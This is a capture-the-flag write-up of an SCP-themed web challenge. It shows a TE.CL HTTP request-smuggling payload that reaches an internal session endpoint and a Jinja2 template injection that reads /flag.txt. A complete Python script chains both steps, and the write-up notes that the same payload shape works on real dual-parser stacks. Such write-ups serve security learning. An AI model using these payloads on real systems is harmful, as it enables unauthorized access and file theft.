01 //

triage

recon / 403 bypass

The landing page at the root is an SCP-themed Site-19 Emergency Operations Mirror. The navigation points to /login and /employee.

Hitting /employee returned a 403 Forbidden, but the response headers mapped out exactly what I needed to do:

x-employee-gate: internal x-internal-request: GET /employee/session x-site19-edge: POST /employee accepts raw_request or text/plain raw HTTP

The response body spells out the requirements. The edge parser honors Transfer-Encoding: chunked. The bridge parser trusts Content-Length before forwarding remaining bytes. The target is an internal GET /employee/session HTTP/1.1 request carrying the X-Employee-Gate: internal header.

Directly requesting /employee/session failed. I needed to push the internal request through the bridge.

02 //

te.cl request smuggling

exploit / bypass

The two parsers disagree on how to find the end of the HTTP body.

The edge parser uses Transfer-Encoding: chunked, reading until it hits the 0 terminator. The bridge parser uses Content-Length, then forwards any remaining bytes as the next request.

I crafted a request whose chunked body was just the empty terminator (5 bytes). I set Content-Length: 5 so the bridge consumed those bytes and treated everything after as my smuggled internal call.

Dead End: JWT Forging

I initially dumped the JWT token from the session cookie and tried to brute-force the HMAC secret offline, thinking I needed to forge an admin token. I wasted an hour before realizing the token was a red herring and the real vulnerability was the HTTP parsing desync.

POST /employee HTTP/1.1 Host: x Content-Length: 5 Transfer-Encoding: chunked 0 GET /employee/session HTTP/1.1 Host: x X-Employee-Gate: internal

Submitting this payload as the raw_request form field returns a 200 OK and hands back a Flask session cookie for the user cassie.

jinja2 ssti

exploit / flag

The internal session unlocks several endpoints, including /briefing-template. The operator notes confirm the engine is Jinja2, the flag is at /flag.txt, and a read_file(path) helper is available.

The form renders the template field through Jinja2 server-side. Injecting {{ read_file('/flag.txt') }} evaluates the template and returns the file contents.

import requests

B = "https://ganzir-f08cf4757641.inst.omnictf.com"

smuggled = "GET /employee/session HTTP/1.1\r\nHost: x\r\nX-Employee-Gate: internal\r\n\r\n"
term = "0\r\n\r\n"

raw = (
    "POST /employee HTTP/1.1\r\n"
    "Host: x\r\n"
    f"Content-Length: {len(term)}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    f"{term}{smuggled}"
)

print("[*] Sending smuggled request...")
s = requests.Session()
try:
    resp = s.post(B + "/employee", data={"raw_request": raw}, timeout=20)
    print(f"[+] Status: {resp.status_code}")
    cookies = s.cookies.get_dict()
    print(f"[+] Cookies: {cookies}")
    
    if "site19_session" in cookies or "session" in cookies:
        print("[*] Triggering SSTI...")
        r = s.post(B + "/briefing-template", data={"template": "{{ 7*7 }} {{ read_file('/flag.txt') }}"}, timeout=20)
        print(f"[+] Status: {r.status_code}")
        print("[+] Output:")
        print(r.text)
    else:
        print("[-] Failed to get session cookie")
except Exception as e:
    print(f"[-] Error: {e}")

appendix

takeaways

The challenge simulated the desync inside one app, so no low-level socket work was required. The same payload shape works against real dual-parser stacks.

The JWT token was a red herring. Always follow the primitives that point to file reads.
